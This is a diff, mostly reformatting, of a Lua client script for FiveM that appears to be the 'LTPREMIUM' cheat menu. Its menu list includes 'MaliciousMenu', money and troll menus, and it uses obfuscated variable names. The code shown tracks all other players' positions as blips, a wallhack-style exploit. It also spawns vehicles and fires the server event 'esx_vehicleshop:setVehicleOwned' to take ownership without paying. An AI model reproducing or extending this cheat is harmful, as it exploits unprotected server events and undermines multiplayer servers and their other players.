@@ -1,6 +1,3 @@
-
-
-
 enabled = enabled
 KAKAAKAKAK = enabled
 
@@ -11,7 +8,7 @@ TriggerServerEvent = TriggerServerEvent
 GetHashKey = GetHashKey
 
 
-LTPREMIUM = { } 
+LTPREMIUM = {}
 LTPREMIUM.debug = false
 
 jd366213 = false
@@ -20,13 +17,13 @@ ihrug = nil
 WADUI = ihrug
 
 local entityEnumerator = {
-	__gc = function(enum)
-		if enum.destructor and enum.handle then
-			enum.destructor(enum.handle)
-		end
-		enum.destructor = nil
-		enum.handle = nil
-	end
+    __gc = function(enum)
+        if enum.destructor and enum.handle then
+            enum.destructor(enum.handle)
+        end
+        enum.destructor = nil
+        enum.handle = nil
+    end
 }
 wdihwaduaw = true
 jejejejej = wdihwaduaw
@@ -35,34 +32,34 @@ waduyh487r64 = xjbvxyg3e
 
 
 function EnumerateEntities(initFunc, moveFunc, disposeFunc)
-	return coroutine.wrap(function()
-		local iter, id = initFunc()
-		if not id or id == 0 then
-			disposeFunc(iter)
-			return
-		end
-	
-		local enum = {handle = iter, destructor = disposeFunc}
-		setmetatable(enum, entityEnumerator)
-	
-		local next = true
-		repeat
-			coroutine.yield(id)
-			next, id = moveFunc(iter)
-		until not next
-	
-		enum.destructor, enum.handle = nil, nil
-		disposeFunc(iter)
-	end)
+    return coroutine.wrap(function()
+        local iter, id = initFunc()
+        if not id or id == 0 then
+            disposeFunc(iter)
+            return
+        end
+
+        local enum = { handle = iter, destructor = disposeFunc }
+        setmetatable(enum, entityEnumerator)
+
+        local next = true
+        repeat
+            coroutine.yield(id)
+            next, id = moveFunc(iter)
+        until not next
+
+        enum.destructor, enum.handle = nil, nil
+        disposeFunc(iter)
+    end)
 end
 
 function EnumeratePeds()
     return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
 end
 
-  function EnumerateVehicles()
-	return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
-  end
+function EnumerateVehicles()
+    return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
+end
 
 function GetAllPeds()
     local peds123 = {}
@@ -74,161 +71,163 @@ function GetAllPeds()
     return peds123
 end
 
-
-
-  
 local Deer = {
-	Handle = nil,
-	Invincible = false,
-	Ragdoll = false,
-	Marker = false,
-	Speed = {
-		Walk = 3.0,
-		Run = 9.0,
-	},
+    Handle = nil,
+    Invincible = false,
+    Ragdoll = false,
+    Marker = false,
+    Speed = {
+        Walk = 3.0,
+        Run = 9.0,
+    },
 }
 
 function GetNearbyPeds(X, Y, Z, Radius)
-	local NearbyPeds = {}
-	for Ped in EnumeratePeds() do
-		if DoesEntityExist(Ped) then
-			local PedPosition = GetEntityCoords(Ped, false)
-			if Vdist(X, Y, Z, PedPosition.x, PedPosition.y, PedPosition.z) <= Radius then
-				table.insert(NearbyPeds, Ped)
-			end
-		end
-	end
-	return NearbyPeds
+    local NearbyPeds = {}
+    for Ped in EnumeratePeds() do
+        if DoesEntityExist(Ped) then
+            local PedPosition = GetEntityCoords(Ped, false)
+            if Vdist(X, Y, Z, PedPosition.x, PedPosition.y, PedPosition.z) <= Radius then
+                table.insert(NearbyPeds, Ped)
+            end
+        end
+    end
+    return NearbyPeds
 end
 
 function GetCoordsInfrontOfEntityWithDistance(Entity, Distance, Heading)
-	local Coordinates = GetEntityCoords(Entity, false)
-	local Head = (GetEntityHeading(Entity) + (Heading or 0.0)) * math.pi / 180.0
-	return {x = Coordinates.x + Distance * math.sin(-1.0 * Head), y = Coordinates.y + Distance * math.cos(-1.0 * Head), z = Coordinates.z}
+    local Coordinates = GetEntityCoords(Entity, false)
+    local Head = (GetEntityHeading(Entity) + (Heading or 0.0)) * math.pi / 180.0
+    return { x = Coordinates.x + Distance * math.sin(-1.0 * Head), y = Coordinates.y + Distance * math.cos(-1.0 * Head), z =
+    Coordinates.z }
 end
 
 function GetGroundZ(X, Y, Z)
-	if tonumber(X) and tonumber(Y) and tonumber(Z) then
-		local _, GroundZ = GetGroundZFor_3dCoord(X + 0.0, Y + 0.0, Z + 0.0, Citizen.ReturnResultAnyway())
-		return GroundZ
-	else
-		return 0.0
-	end
+    if tonumber(X) and tonumber(Y) and tonumber(Z) then
+        local _, GroundZ = GetGroundZFor_3dCoord(X + 0.0, Y + 0.0, Z + 0.0, Citizen.ReturnResultAnyway())
+        return GroundZ
+    else
+        return 0.0
+    end
 end
 
 function Deer.Destroy()
-	local Ped = PlayerPedId()
+    local Ped = PlayerPedId()
 
-	DetachEntity(Ped, true, false)
-	ClearPedTasksImmediately(Ped)
+    DetachEntity(Ped, true, false)
+    ClearPedTasksImmediately(Ped)
 
-	SetEntityAsNoLongerNeeded(Deer.Handle)
-	DeletePed(Deer.Handle)
+    SetEntityAsNoLongerNeeded(Deer.Handle)
+    DeletePed(Deer.Handle)
 
-	if DoesEntityExist(Deer.Handle) then
-		SetEntityCoords(Deer.Handle, 601.28948974609, -4396.9853515625, 384.98565673828)
-	end
+    if DoesEntityExist(Deer.Handle) then
+        SetEntityCoords(Deer.Handle, 601.28948974609, -4396.9853515625, 384.98565673828)
+    end
 
-	Deer.Handle = nil
+    Deer.Handle = nil
 end
 
 function Deer.Create()
-	local Model = GetHashKey("a_c_deer")
-	RequestModel(Model)
-	while not HasModelLoaded(Model) do
-		Citizen.Wait(50)
-	end
+    local Model = GetHashKey("a_c_deer")
+    RequestModel(Model)
+    while not HasModelLoaded(Model) do
+        Citizen.Wait(50)
+    end
 
-	local Ped = PlayerPedId()
-	local PedPosition = GetEntityCoords(Ped, false)
+    local Ped = PlayerPedId()
+    local PedPosition = GetEntityCoords(Ped, false)
 
-	Deer.Handle = CreatePed(28, Model, PedPosition.x+1, PedPosition.y, PedPosition.z, GetEntityHeading(Ped), true, false)
+    Deer.Handle = CreatePed(28, Model, PedPosition.x + 1, PedPosition.y, PedPosition.z, GetEntityHeading(Ped), true,
+        false)
 
-	SetPedCanRagdoll(Deer.Handle, Deer.Ragdoll)
-	SetEntityInvincible(Deer.Handle, Deer.Invincible)
+    SetPedCanRagdoll(Deer.Handle, Deer.Ragdoll)
+    SetEntityInvincible(Deer.Handle, Deer.Invincible)
 
-	SetModelAsNoLongerNeeded(Model)
+    SetModelAsNoLongerNeeded(Model)
 end
 
 function Deer.Attach()
-	local Ped = PlayerPedId()
+    local Ped = PlayerPedId()
 
-	FreezeEntityPosition(Deer.Handle, true)
-	FreezeEntityPosition(Ped, true)
+    FreezeEntityPosition(Deer.Handle, true)
+    FreezeEntityPosition(Ped, true)
 
-	local DeerPosition = GetEntityCoords(Deer.Handle, false)
-	SetEntityCoords(Ped, DeerPosition.x, DeerPosition.y, DeerPosition.z)
+    local DeerPosition = GetEntityCoords(Deer.Handle, false)
+    SetEntityCoords(Ped, DeerPosition.x, DeerPosition.y, DeerPosition.z)
 
-	AttachEntityToEntity(Ped, Deer.Handle, GetPedBoneIndex(Deer.Handle, 24816), -0.3, 0.0, 0.3, 0.0, 0.0, 90.0, false, false, false, true, 2, true)
+    AttachEntityToEntity(Ped, Deer.Handle, GetPedBoneIndex(Deer.Handle, 24816), -0.3, 0.0, 0.3, 0.0, 0.0, 90.0, false,
+        false, false, true, 2, true)
 
-	TaskPlayAnim(Ped, "rcmjosh2", "josh_sitting_loop", 8.0, 1, -1, 2, 1.0, 0, 0, 0)
+    TaskPlayAnim(Ped, "rcmjosh2", "josh_sitting_loop", 8.0, 1, -1, 2, 1.0, 0, 0, 0)
 
-	FreezeEntityPosition(Deer.Handle, false)
-	FreezeEntityPosition(Ped, false)
+    FreezeEntityPosition(Deer.Handle, false)
+    FreezeEntityPosition(Ped, false)
 end
 
 function Deer.Ride()
-	local Ped = PlayerPedId()
-	local PedPosition = GetEntityCoords(Ped, false)
-	if IsPedSittingInAnyVehicle(Ped) or IsPedGettingIntoAVehicle(Ped) then
-		return
-	end
+    local Ped = PlayerPedId()
+    local PedPosition = GetEntityCoords(Ped, false)
+    if IsPedSittingInAnyVehicle(Ped) or IsPedGettingIntoAVehicle(Ped) then
+        return
+    end
 
-	local AttachedEntity = GetEntityAttachedTo(Ped)
+    local AttachedEntity = GetEntityAttachedTo(Ped)
 
-	if IsEntityAttached(Ped) and GetEntityModel(AttachedEntity) == GetHashKey("a_c_deer") then
-		local SideCoordinates = GetCoordsInfrontOfEntityWithDistance(AttachedEntity, 1.0, 90.0)
-		local SideHeading = GetEntityHeading(AttachedEntity)
+    if IsEntityAttached(Ped) and GetEntityModel(AttachedEntity) == GetHashKey("a_c_deer") then
+        local SideCoordinates = GetCoordsInfrontOfEntityWithDistance(AttachedEntity, 1.0, 90.0)
+        local SideHeading = GetEntityHeading(AttachedEntity)
 
-		SideCoordinates.z = GetGroundZ(SideCoordinates.x, SideCoordinates.y, SideCoordinates.z)
+        SideCoordinates.z = GetGroundZ(SideCoordinates.x, SideCoordinates.y, SideCoordinates.z)
 
-		Deer.Handle = nil
-		DetachEntity(Ped, true, false)
-		ClearPedTasksImmediately(Ped)
+        Deer.Handle = nil
+        DetachEntity(Ped, true, false)
+        ClearPedTasksImmediately(Ped)
 
-		SetEntityCoords(Ped, SideCoordinates.x, SideCoordinates.y, SideCoordinates.z)
-		SetEntityHeading(Ped, SideHeading)
-	else
-		for _, Ped in pairs(GetNearbyPeds(PedPosition.x, PedPosition.y, PedPosition.z, 2.0)) do
-			if GetEntityModel(Ped) == GetHashKey("a_c_deer") then
-				Deer.Handle = Ped
-				Deer.Attach()
-				break
-			end
-		end
-	end
+        SetEntityCoords(Ped, SideCoordinates.x, SideCoordinates.y, SideCoordinates.z)
+        SetEntityHeading(Ped, SideHeading)
+    else
+        for _, Ped in pairs(GetNearbyPeds(PedPosition.x, PedPosition.y, PedPosition.z, 2.0)) do
+            if GetEntityModel(Ped) == GetHashKey("a_c_deer") then
+                Deer.Handle = Ped
+                Deer.Attach()
+                break
+            end
+        end
+    end
 end
 
 Citizen.CreateThread(function()
-	RequestAnimDict("rcmjosh2")
-	while not HasAnimDictLoaded("rcmjosh2") do
-		Citizen.Wait(250)
-	end
-	while true do
-		Citizen.Wait(-1000)
+    RequestAnimDict("rcmjosh2")
+    while not HasAnimDictLoaded("rcmjosh2") do
+        Citizen.Wait(250)
+    end
+    while true do
+        Citizen.Wait(-1000)
 
 
 
-		local Ped = PlayerPedId()
-		local AttachedEntity = GetEntityAttachedTo(Ped)
+        local Ped = PlayerPedId()
+        local AttachedEntity = GetEntityAttachedTo(Ped)
 
-		if (not IsPedSittingInAnyVehicle(Ped) or not IsPedGettingIntoAVehicle(Ped)) and IsEntityAttached(Ped) and AttachedEntity == Deer.Handle then
-			if DoesEntityExist(Deer.Handle) then
-				local LeftAxisXNormal, LeftAxisYNormal = GetControlNormal(2, 218), GetControlNormal(2, 219)
-				local Speed, Range = Deer.Speed.Walk, 4000.0
+        if (not IsPedSittingInAnyVehicle(Ped) or not IsPedGettingIntoAVehicle(Ped)) and IsEntityAttached(Ped) and AttachedEntity == Deer.Handle then
+            if DoesEntityExist(Deer.Handle) then
+                local LeftAxisXNormal, LeftAxisYNormal = GetControlNormal(2, 218), GetControlNormal(2, 219)
+                local Speed, Range = Deer.Speed.Walk, 4000.0
 
 
-				local GoToOffset = GetOffsetFromEntityInWorldCoords(Deer.Handle, LeftAxisXNormal * Range, LeftAxisYNormal * -1.0 * Range, 0.0)
+                local GoToOffset = GetOffsetFromEntityInWorldCoords(Deer.Handle, LeftAxisXNormal * Range,
+                    LeftAxisYNormal * -1.0 * Range, 0.0)
 
-				TaskLookAtCoord(Deer.Handle, GoToOffset.x, GoToOffset.y, GoToOffset.z, 0, 0, 2)
-				TaskGoStraightToCoord(Deer.Handle, GoToOffset.x, GoToOffset.y, GoToOffset.z, Speed, 20000, 40000.0, 0.5)
+                TaskLookAtCoord(Deer.Handle, GoToOffset.x, GoToOffset.y, GoToOffset.z, 0, 0, 2)
+                TaskGoStraightToCoord(Deer.Handle, GoToOffset.x, GoToOffset.y, GoToOffset.z, Speed, 20000, 40000.0, 0.5)
 
-				if Deer.Marker then
-					DrawMarker(6, GoToOffset.x, GoToOffset.y, GoToOffset.z, 0, 0, 0, 0, 0, 0, 1.0, 1.0, 1.0, 255, 255, 255, 255, 0, 0, 2, 0, 0, 0, 0)
-				end
-			end
-		end
-	end
+                if Deer.Marker then
+                    DrawMarker(6, GoToOffset.x, GoToOffset.y, GoToOffset.z, 0, 0, 0, 0, 0, 0, 1.0, 1.0, 1.0, 255, 255,
+                        255, 255, 0, 0, 2, 0, 0, 0, 0)
+                end
+            end
+        end
+    end
 end)
 
 
@@ -250,235 +249,234 @@ local cg = true
 local ch = false
 local ci = true
 local chdata = {}
-	function mysplit(inputstr, sep)
-		if sep == nil then
-			sep = "%s"
-		end
-		local t={} ; i=1
-		for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
-			t[i] = str
-			i = i + 1
-		end
-		return t
-	end
+function mysplit(inputstr, sep)
+    if sep == nil then
+        sep = "%s"
+    end
+    local t = {}; i = 1
+    for str in string.gmatch(inputstr, "([^" .. sep .. "]+)") do
+        t[i] = str
+        i = i + 1
+    end
+    return t
+end
 
-	local allMenus = { "MainMenu", "SelfMenu", "OnlinePlayersMenu", "WeaponMenu", "SingleWeaponMenu", "MaliciousMenu",
-                            "ESXMenu", "ESXJobMenu", "ESXMoneyMenu", "VehMenu", "VehSpawnOpt", "PlayerOptionsMenu",
-                            "TeleportMenu", "LSC", "Hedit", "PlayerTrollMenu", "PlayerESXMenu", "PlayerESXJobMenu",
-                            "PlayerESXTriggerMenu", "BulletGunMenu", "TrollMenu", "WeaponCustomization", "WeaponTintMenu",
-                            "VehicleRamMenu", "ESXBossMenu", "SpawnPropsMenu", "SingleWepPlayer", "VehBoostMenu",
-                            "ESXMiscMenu", "ESXDrugMenu", "AI", "SettingsMenu", "VRPMenu"}
-	
+local allMenus = { "MainMenu", "SelfMenu", "OnlinePlayersMenu", "WeaponMenu", "SingleWeaponMenu", "MaliciousMenu",
+    "ESXMenu", "ESXJobMenu", "ESXMoneyMenu", "VehMenu", "VehSpawnOpt", "PlayerOptionsMenu",
+    "TeleportMenu", "LSC", "Hedit", "PlayerTrollMenu", "PlayerESXMenu", "PlayerESXJobMenu",
+    "PlayerESXTriggerMenu", "BulletGunMenu", "TrollMenu", "WeaponCustomization", "WeaponTintMenu",
+    "VehicleRamMenu", "ESXBossMenu", "SpawnPropsMenu", "SingleWepPlayer", "VehBoostMenu",
+    "ESXMiscMenu", "ESXDrugMenu", "AI", "SettingsMenu", "VRPMenu" }
+
 local handlingData = {
-	"handlingName",
-	"fMass",
-	"fInitialDragCoeff",
-	"fPercentSubmerged",
-	"vecCentreOfMassOffset",
-	"vecInertiaMultiplier",
-	"fDriveBiasFront",
-	"nInitialDriveGears",
-	"fInitialDriveForce",
-	"fDriveInertia",
-	"fClutchChangeRateScaleUpShift",
-	"fClutchChangeRateScaleDownShift",
-	"fInitialDriveMaxFlatVel",
-	"fBrakeForce",
-	"fBrakeBiasFront",
-	"fHandBrakeForce",
-	"fSteeringLock",
-	"fTractionCurveMax",
-	"fTractionCurveMin",
-	"fTractionCurveLateral",
-	"fTractionSpringDeltaMax",
-	"fLowSpeedTractionLossMult",
-	"fCamberStiffnesss",
-	"fTractionBiasFront",
-	"fTractionLossMult",
-	"fSuspensionForce",
-	"fSuspensionCompDamp",
-	"fSuspensionReboundDamp",
-	"fSuspensionUpperLimit",
-	"fSuspensionLowerLimit",
-	"fSuspensionRaise",
-	"fSuspensionBiasFront",
-	"fTractionCurveMax",
-	"fAntiRollBarForce",
-	"fAntiRollBarBiasFront",
-	"fRollCentreHeightFront",
-	"fRollCentreHeightRear",
-	"fCollisionDamageMult",
-	"fWeaponDamageMult",
-	"fDeformationDamageMult",
-	"fEngineDamageMult",
-	"fPetrolTankVolume",
-	"fOilVolume",
-	"fSeatOffsetDistX",
-	"fSeatOffsetDistY",
-	"fSeatOffsetDistZ",
-	"nMonetaryValue",
-	"strModelFlags",
-	"strHandlingFlags",
-	"strDamageFlags",
-	"AIHandling",
-	
-	
-	"fThrust",
-	"fThrustFallOff",
-	"fThrustVectoring",
-	"fYawMult",
-	"fYawStabilise",
-	"fSideSlipMult",
-	"fRollMult",
-	"fRollStabilise",
-	"fPitchMult",
-	"fPitchStabilise",
-	"fFormLiftMult",
-	"fAttackLiftMult",
-	"fAttackDiveMult",
-	"fGearDownDragV",
-	"fGearDownLiftMult",
-	"fWindMult",
-	"fMoveRes",
-	"vecTurnRes",
-	"vecSpeedRes",
-	"fGearDoorFrontOpen",
-	"fGearDoorRearOpen",
-	"fGearDoorRearOpen2",
-	"fGearDoorRearMOpen",
-	"fTurublenceMagnitudeMax",
-	"fTurublenceForceMulti",
-	"fTurublenceRollTorqueMulti",
-	"fTurublencePitchTorqueMulti",
-	"fBodyDamageControlEffectMult",
-	"fInputSensitivityForDifficulty",
-	"fOnGroundYawBoostSpeedPeak",
-	"fOnGroundYawBoostSpeedCap",
-	"fEngineOffGlideMulti",
-	"handlingType",
-	"fThrustFallOff",
-	"fThrustFallOff",
-	
-	
-	"fBackEndPopUpCarImpulseMult",
-	"fBackEndPopUpBuildingImpulseMult",
-	"fBackEndPopUpMaxDeltaSpeed",
-	
-	
+    "handlingName",
+    "fMass",
+    "fInitialDragCoeff",
+    "fPercentSubmerged",
+    "vecCentreOfMassOffset",
+    "vecInertiaMultiplier",
+    "fDriveBiasFront",
+    "nInitialDriveGears",
+    "fInitialDriveForce",
+    "fDriveInertia",
+    "fClutchChangeRateScaleUpShift",
+    "fClutchChangeRateScaleDownShift",
+    "fInitialDriveMaxFlatVel",
+    "fBrakeForce",
+    "fBrakeBiasFront",
+    "fHandBrakeForce",
+    "fSteeringLock",
+    "fTractionCurveMax",
+    "fTractionCurveMin",
+    "fTractionCurveLateral",
+    "fTractionSpringDeltaMax",
+    "fLowSpeedTractionLossMult",
+    "fCamberStiffnesss",
+    "fTractionBiasFront",
+    "fTractionLossMult",
+    "fSuspensionForce",
+    "fSuspensionCompDamp",
+    "fSuspensionReboundDamp",
+    "fSuspensionUpperLimit",
+    "fSuspensionLowerLimit",
+    "fSuspensionRaise",
+    "fSuspensionBiasFront",
+    "fTractionCurveMax",
+    "fAntiRollBarForce",
+    "fAntiRollBarBiasFront",
+    "fRollCentreHeightFront",
+    "fRollCentreHeightRear",
+    "fCollisionDamageMult",
+    "fWeaponDamageMult",
+    "fDeformationDamageMult",
+    "fEngineDamageMult",
+    "fPetrolTankVolume",
+    "fOilVolume",
+    "fSeatOffsetDistX",
+    "fSeatOffsetDistY",
+    "fSeatOffsetDistZ",
+    "nMonetaryValue",
+    "strModelFlags",
+    "strHandlingFlags",
+    "strDamageFlags",
+    "AIHandling",
 
-	
-	"fLeanFwdCOMMult",
-	"fLeanFwdForceMult",
-	"fLeanBakCOMMult",
-	"fLeanBakForceMult",
-	"fMaxBankAngle",
-	"fFullAnimAngle",
-	"fDesLeanReturnFrac",
-	"fStickLeanMult",
-	"fBrakingStabilityMult",
-	"fInAirSteerMult",
-	"fWheelieBalancePoint",
-	"fStoppieBalancePoint",
-	"fWheelieSteerMult",
-	"fRearBalanceMult",
-	"fFrontBalanceMult",
-	"fBikeGroundSideFrictionMult",
-	"fBikeWheelGroundSideFrictionMult",
-	"fBikeOnStandLeanAngle",
-	"fBikeOnStandSteerAngle",
-	"fJumpForce",
+
+    "fThrust",
+    "fThrustFallOff",
+    "fThrustVectoring",
+    "fYawMult",
+    "fYawStabilise",
+    "fSideSlipMult",
+    "fRollMult",
+    "fRollStabilise",
+    "fPitchMult",
+    "fPitchStabilise",
+    "fFormLiftMult",
+    "fAttackLiftMult",
+    "fAttackDiveMult",
+    "fGearDownDragV",
+    "fGearDownLiftMult",
+    "fWindMult",
+    "fMoveRes",
+    "vecTurnRes",
+    "vecSpeedRes",
+    "fGearDoorFrontOpen",
+    "fGearDoorRearOpen",
+    "fGearDoorRearOpen2",
+    "fGearDoorRearMOpen",
+    "fTurublenceMagnitudeMax",
+    "fTurublenceForceMulti",
+    "fTurublenceRollTorqueMulti",
+    "fTurublencePitchTorqueMulti",
+    "fBodyDamageControlEffectMult",
+    "fInputSensitivityForDifficulty",
+    "fOnGroundYawBoostSpeedPeak",
+    "fOnGroundYawBoostSpeedCap",
+    "fEngineOffGlideMulti",
+    "handlingType",
+    "fThrustFallOff",
+    "fThrustFallOff",
+
+
+    "fBackEndPopUpCarImpulseMult",
+    "fBackEndPopUpBuildingImpulseMult",
+    "fBackEndPopUpMaxDeltaSpeed",
+
+
+
+
+    "fLeanFwdCOMMult",
+    "fLeanFwdForceMult",
+    "fLeanBakCOMMult",
+    "fLeanBakForceMult",
+    "fMaxBankAngle",
+    "fFullAnimAngle",
+    "fDesLeanReturnFrac",
+    "fStickLeanMult",
+    "fBrakingStabilityMult",
+    "fInAirSteerMult",
+    "fWheelieBalancePoint",
+    "fStoppieBalancePoint",
+    "fWheelieSteerMult",
+    "fRearBalanceMult",
+    "fFrontBalanceMult",
+    "fBikeGroundSideFrictionMult",
+    "fBikeWheelGroundSideFrictionMult",
+    "fBikeOnStandLeanAngle",
+    "fBikeOnStandSteerAngle",
+    "fJumpForce",
 }
 
 
 
 Citizen.CreateThread(function()
+    function SetVehicleHandlingData(Vehicle, Data, Value)
+        if DoesEntityExist(Vehicle) and Data and Value then
+            for theKey, property in pairs(handlingData) do
+                if property == Data then
+                    local intfind = string.find(property, "n")
+                    local floatfind = string.find(property, "f")
+                    local strfind = string.find(property, "str")
+                    local vecfind = string.find(property, "vec")
 
-	function SetVehicleHandlingData(Vehicle,Data,Value) 
-		if DoesEntityExist(Vehicle) and Data and Value then
-			for theKey,property in pairs(handlingData) do 
-				if property == Data then
-					local intfind = string.find(property, "n" ) 
-					local floatfind = string.find(property, "f" )
-					local strfind = string.find(property, "str" )
-					local vecfind = string.find(property, "vec" )
-					
-					
-					if intfind ~= nil and intfind == 1 then
-						SetVehicleHandlingInt( Vehicle, "CHandlingData", Data, tonumber(Value) ) 
-					elseif floatfind ~= nil and floatfind == 1 then
-						local Value = tonumber(Value)+.0
-						SetVehicleHandlingFloat( Vehicle, "CHandlingData", Data, tonumber(Value) )
-					elseif strfind ~= nil and strfind == 1 then
-						SetVehicleHandlingField( Vehicle, "CHandlingData", Data, Value )
-					elseif vecfind ~= nil and vecfind == 1 then
-						SetVehicleHandlingVector( Vehicle, "CHandlingData", Data, Value )
-					else
-						SetVehicleHandlingField( Vehicle, "CHandlingData", Data, Value )
-					end
-				end
-			end
-		end
-	end
-	
-	
-	function GetVehicleHandlingData(Vehicle,Data)
-		if DoesEntityExist(Vehicle) then
-			for theKey,property in pairs(handlingData) do 
-				if property == Data then
-					local intfind = string.find(property, "n" )
-					local floatfind = string.find(property, "f" )
-					local strfind = string.find(property, "str" )
-					local vecfind = string.find(property, "vec" )
-					
-					if intfind ~= nil and intfind == 1 then
-						return GetVehicleHandlingInt( Vehicle, "CHandlingData", Data )
-					elseif floatfind ~= nil and floatfind == 1 then
-						return GetVehicleHandlingFloat( Vehicle, "CHandlingData", Data )
-					elseif vecfind ~= nil and vecfind == 1 then
-						return GetVehicleHandlingVector( Vehicle, "CHandlingData", Data )
-					else
-						return false
-					end
-				end
-			end
-		end
-	end
-	
-	function GetAllVehicleHandlingData(Vehicle)
-		local VehicleHandlingData = {}
-		if DoesEntityExist(Vehicle) then
-			for i,theData in pairs(handlingData) do 
-				local intfind = string.find(theData, "n" )
-				local floatfind = string.find(theData, "f" )
-				local strfind = string.find(theData, "str" )
-				local vecfind = string.find(theData, "vec" )
-				
-				if intfind ~= nil and intfind == 1 and GetVehicleHandlingInt( Vehicle, "CHandlingData", theData ) then
-					table.insert(VehicleHandlingData, { name = theData, value = GetVehicleHandlingInt( Vehicle, "CHandlingData", theData ), type = "int" }  )
-				elseif floatfind ~= nil and floatfind == 1 and GetVehicleHandlingFloat( Vehicle, "CHandlingData", theData ) then
-					table.insert(VehicleHandlingData, { name = theData, value = GetVehicleHandlingFloat( Vehicle, "CHandlingData", theData ), type = "float" } )
-				elseif vecfind ~= nil and vecfind == 1 and GetVehicleHandlingVector( Vehicle, "CHandlingData", theData ) then
-					table.insert(VehicleHandlingData, { name = theData, value = GetVehicleHandlingVector( Vehicle, "CHandlingData", theData ), type = "vector3" } )
-				end
-			end
-			return VehicleHandlingData
-		end
-	end
-	
-		
-	
-	
+
+                    if intfind ~= nil and intfind == 1 then
+                        SetVehicleHandlingInt(Vehicle, "CHandlingData", Data, tonumber(Value))
+                    elseif floatfind ~= nil and floatfind == 1 then
+                        local Value = tonumber(Value) + .0
+                        SetVehicleHandlingFloat(Vehicle, "CHandlingData", Data, tonumber(Value))
+                    elseif strfind ~= nil and strfind == 1 then
+                        SetVehicleHandlingField(Vehicle, "CHandlingData", Data, Value)
+                    elseif vecfind ~= nil and vecfind == 1 then
+                        SetVehicleHandlingVector(Vehicle, "CHandlingData", Data, Value)
+                    else
+                        SetVehicleHandlingField(Vehicle, "CHandlingData", Data, Value)
+                    end
+                end
+            end
+        end
+    end
+
+    function GetVehicleHandlingData(Vehicle, Data)
+        if DoesEntityExist(Vehicle) then
+            for theKey, property in pairs(handlingData) do
+                if property == Data then
+                    local intfind = string.find(property, "n")
+                    local floatfind = string.find(property, "f")
+                    local strfind = string.find(property, "str")
+                    local vecfind = string.find(property, "vec")
+
+                    if intfind ~= nil and intfind == 1 then
+                        return GetVehicleHandlingInt(Vehicle, "CHandlingData", Data)
+                    elseif floatfind ~= nil and floatfind == 1 then
+                        return GetVehicleHandlingFloat(Vehicle, "CHandlingData", Data)
+                    elseif vecfind ~= nil and vecfind == 1 then
+                        return GetVehicleHandlingVector(Vehicle, "CHandlingData", Data)
+                    else
+                        return false
+                    end
+                end
+            end
+        end
+    end
+
+    function GetAllVehicleHandlingData(Vehicle)
+        local VehicleHandlingData = {}
+        if DoesEntityExist(Vehicle) then
+            for i, theData in pairs(handlingData) do
+                local intfind = string.find(theData, "n")
+                local floatfind = string.find(theData, "f")
+                local strfind = string.find(theData, "str")
+                local vecfind = string.find(theData, "vec")
+
+                if intfind ~= nil and intfind == 1 and GetVehicleHandlingInt(Vehicle, "CHandlingData", theData) then
+                    table.insert(VehicleHandlingData,
+                        { name = theData, value = GetVehicleHandlingInt(Vehicle, "CHandlingData", theData), type = "int" })
+                elseif floatfind ~= nil and floatfind == 1 and GetVehicleHandlingFloat(Vehicle, "CHandlingData", theData) then
+                    table.insert(VehicleHandlingData,
+                        { name = theData, value = GetVehicleHandlingFloat(Vehicle, "CHandlingData", theData), type =
+                        "float" })
+                elseif vecfind ~= nil and vecfind == 1 and GetVehicleHandlingVector(Vehicle, "CHandlingData", theData) then
+                    table.insert(VehicleHandlingData,
+                        { name = theData, value = GetVehicleHandlingVector(Vehicle, "CHandlingData", theData), type =
+                        "vector3" })
+                end
+            end
+            return VehicleHandlingData
+        end
+    end
 end
 )
 
 Citizen.CreateThread(function()
-	while true do
-		Citizen.Wait(-1000)
-		if(states.frozen)then
-			ClearPedTasksImmediately(GetPlayerPed(-1))
-			SetEntityCoords(GetPlayerPed(-1), states.frozenPos)
-		end
-	end
+    while true do
+        Citizen.Wait(-1000)
+        if (states.frozen) then
+            ClearPedTasksImmediately(GetPlayerPed(-1))
+            SetEntityCoords(GetPlayerPed(-1), states.frozenPos)
+        end
+    end
 end)
 
 Citizen.CreateThread(
@@ -487,7 +485,7 @@ Citizen.CreateThread(
             Wait(1)
             for i = 0, 128 do
                 if NetworkIsPlayerActive(i) and GetPlayerPed(i) ~= GetPlayerPed(-1) then
-                   local ped = GetPlayerPed(i)
+                    local ped = GetPlayerPed(i)
                     blip = GetBlipFromEntity(ped)
                     x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                     x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(i), true))
@@ -534,8 +532,8 @@ Citizen.CreateThread(
                                 elseif vehClass == 16 then
                                     if
                                         vehModel == GetHashKey('besra') or vehModel == GetHashKey('hydra') or
-                                            vehModel == GetHashKey('lazer')
-                                     then
+                                        vehModel == GetHashKey('lazer')
+                                    then
                                         if blipSprite ~= 424 then
                                             SetBlipSprite(blip, 424)
                                             Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
@@ -552,8 +550,8 @@ Citizen.CreateThread(
                                     end
                                 elseif
                                     vehModel == GetHashKey('insurgent') or vehModel == GetHashKey('insurgent2') or
-                                        vehModel == GetHashKey('limo2')
-                                 then
+                                    vehModel == GetHashKey('limo2')
+                                then
                                     if blipSprite ~= 426 then
                                         SetBlipSprite(blip, 426)
                                         Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
@@ -625,12 +623,12 @@ local function fv()
         end
         local veh =
             CreateVehicle(
-            GetHashKey(cb),
-            GetEntityCoords(PlayerPedId(-1)),
-            GetEntityHeading(PlayerPedId(-1)),
-            true,
-            true
-        )
+                GetHashKey(cb),
+                GetEntityCoords(PlayerPedId(-1)),
+                GetEntityHeading(PlayerPedId(-1)),
+                true,
+                true
+            )
         SetVehicleNumberPlateText(veh, cw)
         local cx = ESX.Game.GetVehicleProperties(veh)
         TriggerServerEvent('esx_vehicleshop:setVehicleOwned', cx)
@@ -654,374 +652,385 @@ local ba = false
 local bb = false
 local bc = nil
 local bd = {
-        {
-            name = "Spoilers", id = 0
-        }, {
-            name = "Front Bumper", id = 1
-        }, {
-            name = "Rear Bumper", id = 2
-        }, {
-            name = "Side Skirt", id = 3
-        }, {
-            name = "Exhaust", id = 4
-        }, {
-            name = "Frame", id = 5
-        }, {
-            name = "Grille", id = 6
-        }, {
-            name = "Hood", id = 7
-        }, {
-            name = "Fender", id = 8
-        }, {
-            name = "Right Fender", id = 9
-        }, {
